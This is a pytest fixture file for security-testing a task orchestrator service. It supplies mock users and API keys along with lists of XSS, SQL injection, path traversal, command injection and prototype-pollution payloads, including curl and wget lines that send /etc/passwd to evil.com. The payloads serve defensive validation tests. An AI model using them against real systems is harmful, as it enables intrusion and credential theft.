"""
Security Test Fixtures and Utilities

Provides comprehensive fixtures for security testing including mock authentication
contexts, test users with different permissions, malicious payload generators,
performance monitoring utilities, and database state management.
"""

import pytest
import asyncio
import tempfile
import os
import time
import psutil
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Any, Generator, AsyncGenerator
from pathlib import Path

# Import security infrastructure
from mcp_task_orchestrator.infrastructure.security.authentication import APIKeyManager
from mcp_task_orchestrator.infrastructure.security.authorization import Permission, Role

# Import domain entities for testing
from mcp_task_orchestrator.domain.entities.task import Task


# =============================================================================
# Authentication Fixtures
# =============================================================================

@pytest.fixture
def temp_api_key_storage():
    """Provide temporary API key storage for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        storage_path = os.path.join(temp_dir, "test_api_keys.json")
        yield storage_path


@pytest.fixture
def test_api_key_manager(temp_api_key_storage):
    """Provide isolated API key manager for testing."""
    return APIKeyManager(temp_api_key_storage)


@pytest.fixture
def valid_api_key(test_api_key_manager):
    """Generate a valid API key for testing."""
    api_key = test_api_key_manager.generate_api_key(
        description="Test Key",
        expires_days=1
    )
    return api_key


@pytest.fixture
def expired_api_key(test_api_key_manager):
    """Generate an expired API key for testing."""
    # Generate a key and manually expire it
    api_key = test_api_key_manager.generate_api_key(
        description="Expired Test Key",
        expires_days=1
    )
    # Manually set expiration to past
    key_hash = test_api_key_manager._hash_key(api_key)
    test_api_key_manager._keys[key_hash]["expires_at"] = datetime.now(timezone.utc).timestamp() - 3600
    test_api_key_manager._save_keys()
    return api_key


@pytest.fixture
def admin_api_key(test_api_key_manager):
    """Generate an admin API key with all permissions."""
    api_key = test_api_key_manager.generate_api_key(
        description="Admin Test Key",
        expires_days=1
    )
    return api_key


# =============================================================================
# Authorization Fixtures
# =============================================================================

@pytest.fixture
def test_user_basic():
    """Basic user with minimal permissions."""
    return {
        "user_id": "test_user_basic",
        "role": Role.USER,
        "permissions": [Permission.READ_TASK],
        "api_key": "basic_user_key_123"
    }


@pytest.fixture
def test_user_manager():
    """Manager user with elevated permissions."""
    return {
        "user_id": "test_user_manager", 
        "role": Role.MANAGER,
        "permissions": [
            Permission.READ_TASK,
            Permission.CREATE_TASK,
            Permission.UPDATE_TASK,
            Permission.DELETE_TASK
        ],
        "api_key": "manager_user_key_456"
    }


@pytest.fixture
def test_user_admin():
    """Admin user with all permissions."""
    return {
        "user_id": "test_user_admin",
        "role": Role.ADMIN, 
        "permissions": list(Permission),
        "api_key": "admin_user_key_789"
    }


@pytest.fixture
def mock_auth_context():
    """Mock authentication context for testing."""
    def _create_context(user_data: Dict[str, Any]):
        context = Mock()
        context.user_id = user_data["user_id"]
        context.role = user_data["role"]
        context.permissions = user_data["permissions"]
        context.api_key = user_data["api_key"]
        context.is_authenticated = True
        context.has_permission = lambda perm: perm in user_data["permissions"]
        return context
    return _create_context


# =============================================================================
# Malicious Payload Fixtures
# =============================================================================

@pytest.fixture
def xss_payloads():
    """Comprehensive XSS attack payloads."""
    return [
        # Basic script injection
        "<script>alert('xss')</script>",
        "<SCRIPT>alert('xss')</SCRIPT>",
        "<script src='http://evil.com/xss.js'></script>",
        
        # Event handler injection
        "<img src='x' onerror='alert(\"xss\")'>",
        "<svg onload='alert(\"xss\")'>",
        "<body onload='alert(\"xss\")'>",
        "<div onclick='alert(\"xss\")'>click me</div>",
        
        # JavaScript URL schemes
        "javascript:alert('xss')",
        "vbscript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        
        # HTML entity encoding
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        
        # Unicode and UTF-8 encoding
        "\u003cscript\u003ealert('xss')\u003c/script\u003e",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        
        # CSS injection
        "<style>body{background:url('javascript:alert(\"xss\")')}</style>",
        "<link rel='stylesheet' href='javascript:alert(\"xss\")'>",
        
        # DOM-based XSS
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "<object data='javascript:alert(\"xss\")'></object>",
        
        # Filter evasion techniques
        "<script>/**/alert('xss')/**/</script>", 
        "<script>\nalert('xss')\n</script>",
        "<script>eval('alert(\"xss\")')</script>",
        
        # Template injection attempts
        "{{alert('xss')}}",
        "${alert('xss')}",
        "#{alert('xss')}",
        
        # SQL injection in text fields
        "'; DROP TABLE tasks; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --"
    ]


@pytest.fixture
def path_traversal_payloads():
    """Path traversal attack payloads."""
    return [
        # Basic directory traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam", 
        
        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
        
        # Double encoding
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Unicode encoding
        "\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",
        
        # Null byte injection
        "../../../etc/passwd\0.txt",
        "../../../etc/passwd%00.txt",
        
        # Mixed path separators
        "..\\../..\\../..\\../etc/passwd",
        "../..\\../..\\../etc/passwd",
        
        # Absolute paths
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "/proc/self/environ",
        
        # Symbolic link attempts
        "/tmp/symlink_to_etc_passwd",
        "../symlink_to_sensitive_file",
        
        # Special files and devices
        "/dev/null",
        "/dev/random", 
        "/proc/version",
        "/proc/cpuinfo"
    ]


@pytest.fixture
def command_injection_payloads():
    """Command injection attack payloads."""
    return [
        # Basic command injection
        "; cat /etc/passwd",
        "&& cat /etc/passwd",
        "| cat /etc/passwd", 
        "|| cat /etc/passwd",
        
        # Backtick injection
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        
        # Newline injection
        "\ncat /etc/passwd\n",
        "\r\ncat /etc/passwd\r\n",
        
        # URL encoded
        "%3Bcat%20%2Fetc%2Fpasswd",
        "%26%26cat%20%2Fetc%2Fpasswd",
        
        # PowerShell (Windows)
        "; Get-Content C:\\windows\\system32\\drivers\\etc\\hosts",
        "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
        
        # Time-based detection
        "; sleep 10",
        "&& timeout 10",
        "| ping -c 10 127.0.0.1",
        
        # Data exfiltration attempts
        "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "&& wget --post-data \"$(cat /etc/passwd)\" http://evil.com/",
        
        # System information gathering
        "; uname -a",
        "&& whoami",
        "| id",
        "|| ps aux"
    ]


@pytest.fixture
def json_injection_payloads():
    """JSON injection attack payloads."""
    return [
        # JSON structure manipulation
        '{"title":"test","__proto__":{"admin":true}}',
        '{"title":"test","constructor":{"prototype":{"admin":true}}}',
        
        # Prototype pollution
        '{"__proto__.admin":"true"}',
        '{"constructor.prototype.admin":"true"}',
        
        # JSON with embedded code
        '{"title":"<script>alert(\'xss\')</script>"}',
        '{"description":"javascript:alert(\'xss\')"}',
        
        # Malformed JSON
        '{"title":"test"MALFORMED}',
        '{"title":"test","extrakey":}',
        '{"title":undefined,"desc":"test"}',
        
        # Nested injection attempts
        '{"title":"test","metadata":{"__proto__":{"admin":true}}}',
        '{"task":{"title":"../../../etc/passwd"}}',
        
        # Type confusion
        '{"title":123,"description":true}',
        '{"id":"not_a_uuid","title":null}',
        
        # Large payload DoS
        '{"title":"' + 'A' * 100000 + '"}',
        '{"description":"' + 'x' * 1000000 + '"}'
    ]


# =============================================================================
# Performance Monitoring Fixtures
# =============================================================================

@pytest.fixture
def performance_monitor():
    """Performance monitoring utilities for security tests."""
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.start_memory = None
            self.start_cpu = None
            
        def start_monitoring(self):
            """Start performance monitoring."""
            self.start_time = time.time()
            self.start_memory = psutil.Process().memory_info().rss
            self.start_cpu = psutil.cpu_percent()
            
        def get_metrics(self) -> Dict[str, float]:
            """Get current performance metrics."""
            if self.start_time is None:
                raise ValueError("Monitoring not started")
                
            current_time = time.time()
            current_memory = psutil.Process().memory_info().rss
            current_cpu = psutil.cpu_percent()
            
            return {
                "execution_time": current_time - self.start_time,
                "memory_usage_mb": (current_memory - self.start_memory) / 1024 / 1024,
                "cpu_usage_percent": current_cpu,
                "memory_total_mb": current_memory / 1024 / 1024
            }
            
        def assert_performance_limits(self, 
                                    max_execution_time: float = 30.0,
                                    max_memory_mb: float = 100.0,
                                    max_cpu_percent: float = 80.0):
            """Assert performance is within acceptable limits."""
            metrics = self.get_metrics()
            
            assert metrics["execution_time"] < max_execution_time, \
                f"Execution time {metrics['execution_time']:.2f}s exceeds limit {max_execution_time}s"
                
            assert metrics["memory_usage_mb"] < max_memory_mb, \
                f"Memory usage {metrics['memory_usage_mb']:.2f}MB exceeds limit {max_memory_mb}MB"
                
            assert metrics["cpu_usage_percent"] < max_cpu_percent, \
                f"CPU usage {metrics['cpu_usage_percent']:.2f}% exceeds limit {max_cpu_percent}%"
    
    return PerformanceMonitor()


@pytest.fixture
def dos_attack_simulator():
    """DoS attack simulation utilities."""
    class DoSAttackSimulator:
        def __init__(self):
            self.concurrent_requests = []
            
        async def simulate_request_flood(self, 
                                       target_function,
                                       request_count: int = 100,
                                       concurrent_limit: int = 10):
            """Simulate a flood of concurrent requests."""
            semaphore = asyncio.Semaphore(concurrent_limit)
            
            async def make_request():
                async with semaphore:
                    try:
                        return await target_function()
                    except Exception as e:
                        return {"error": str(e)}
            
            tasks = [make_request() for _ in range(request_count)]
            return await asyncio.gather(*tasks, return_exceptions=True)
            
        def generate_large_payload(self, size_mb: float = 10.0) -> str:
            """Generate large payload for memory exhaustion tests."""
            size_bytes = int(size_mb * 1024 * 1024)
            return "x" * size_bytes
            
        def generate_deep_nested_json(self, depth: int = 1000) -> str:
            """Generate deeply nested JSON for parser DoS."""
            nested = "{\"key\": " * depth + "\"value\"" + "}" * depth
            return nested
    
    return DoSAttackSimulator()


# =============================================================================
# Database State Management Fixtures
# =============================================================================

@pytest.fixture
def clean_security_state():
    """Ensure clean security state for each test."""
    # Clear any existing audit logs
    if hasattr(security_audit_logger, 'clear_logs'):
        security_audit_logger.clear_logs()
    
    # Reset API key manager state
    if hasattr(api_key_manager, 'clear_all_keys'):
        api_key_manager.clear_all_keys()
    
    yield
    
    # Cleanup after test
    if hasattr(security_audit_logger, 'clear_logs'):
        security_audit_logger.clear_logs()


@pytest.fixture
def temp_database():
    """Provide temporary database for testing."""
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as temp_file:
        db_path = temp_file.name
    
    try:
        yield db_path
    finally:
        # Cleanup
        if os.path.exists(db_path):
            os.unlink(db_path)


# =============================================================================
# Mock MCP Protocol Fixtures
# =============================================================================

@pytest.fixture
def mock_mcp_request():
    """Mock MCP request for testing."""
    def _create_request(method: str, params: Dict[str, Any], headers: Dict[str, str] = None):
        request = Mock()
        request.method = method
        request.params = params
        request.headers = headers or {}
        return request
    return _create_request


@pytest.fixture
def mock_mcp_context():
    """Mock MCP context for testing."""
    def _create_context(user_data: Dict[str, Any] = None):
        context = Mock()
        if user_data:
            context.user_id = user_data.get("user_id", "test_user")
            context.role = user_data.get("role", Role.USER)
            context.permissions = user_data.get("permissions", [Permission.READ_TASK])
            context.api_key = user_data.get("api_key", "test_key")
        else:
            context.user_id = "anonymous"
            context.role = None
            context.permissions = []
            context.api_key = None
        return context
    return _create_context


# =============================================================================
# Security Test Utilities
# =============================================================================

@pytest.fixture
def security_test_utils():
    """Utility functions for security testing."""
    class SecurityTestUtils:
        @staticmethod
        def assert_no_sensitive_data_in_error(error_message: str):
            """Assert error message doesn't contain sensitive information."""
            sensitive_patterns = [
                r"/[a-zA-Z0-9_/]+\.py",  # File paths
                r"line \d+",              # Line numbers  
                r"Traceback",             # Stack traces
                r"api_key",               # API keys
                r"password",              # Passwords
                r"secret",                # Secrets
                r"token",                 # Tokens
                r"connection_string",     # Connection strings
                r"database",              # Database references
            ]
            
            import re
            for pattern in sensitive_patterns:
                assert not re.search(pattern, error_message, re.IGNORECASE), \
                    f"Error message contains sensitive data: {error_message}"
        
        @staticmethod
        def simulate_timing_attack(func, *args, **kwargs) -> float:
            """Simulate timing attack and return execution time."""
            start_time = time.perf_counter()
            try:
                func(*args, **kwargs)
            except Exception:
                pass  # We're measuring timing, not success
            end_time = time.perf_counter()
            return end_time - start_time
        
        @staticmethod
        def generate_malformed_unicode() -> List[str]:
            """Generate malformed Unicode strings for testing."""
            return [
                "\uD800\uD800",  # Invalid surrogate pair
                "\uDFFF",        # Low surrogate without high surrogate
                "\uFFFE",        # Non-character
                "\uFFFF",        # Non-character
                "\x00",          # Null byte
                "\x1F",          # Control character
                "\x7F",          # DEL character
            ]
    
    return SecurityTestUtils()


# =============================================================================
# Pytest Configuration
# =============================================================================

def pytest_configure(config):
    """Configure pytest for security testing."""
    # Add custom markers
    config.addinivalue_line("markers", "security: mark test as security test")
    config.addinivalue_line("markers", "authentication: mark test as authentication test")
    config.addinivalue_line("markers", "authorization: mark test as authorization test") 
    config.addinivalue_line("markers", "xss: mark test as XSS prevention test")
    config.addinivalue_line("markers", "path_traversal: mark test as path traversal test")
    config.addinivalue_line("markers", "performance: mark test as performance security test")
    config.addinivalue_line("markers", "critical: mark test as critical security test")
    config.addinivalue_line("markers", "attack_simulation: mark test as attack simulation")
    config.addinivalue_line("markers", "information_disclosure: mark test as information disclosure test")


def pytest_collection_modifyitems(config, items):
    """Modify test items to add security markers."""
    # Auto-add security marker to all tests in security directory
    for item in items:
        if "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
            
            # Add specific markers based on test name patterns
            test_name = item.name.lower()
            if "auth" in test_name and "authentication" in test_name:
                item.add_marker(pytest.mark.authentication)
            elif "authorization" in test_name:
                item.add_marker(pytest.mark.authorization)
            elif "xss" in test_name:
                item.add_marker(pytest.mark.xss)
            elif "path" in test_name and "traversal" in test_name:
                item.add_marker(pytest.mark.path_traversal)
            elif "performance" in test_name or "dos" in test_name:
                item.add_marker(pytest.mark.performance)
            elif "critical" in test_name:
                item.add_marker(pytest.mark.critical)
            elif "attack" in test_name:
                item.add_marker(pytest.mark.attack_simulation)
            elif "disclosure" in test_name or "error" in test_name:
                item.add_marker(pytest.mark.information_disclosure)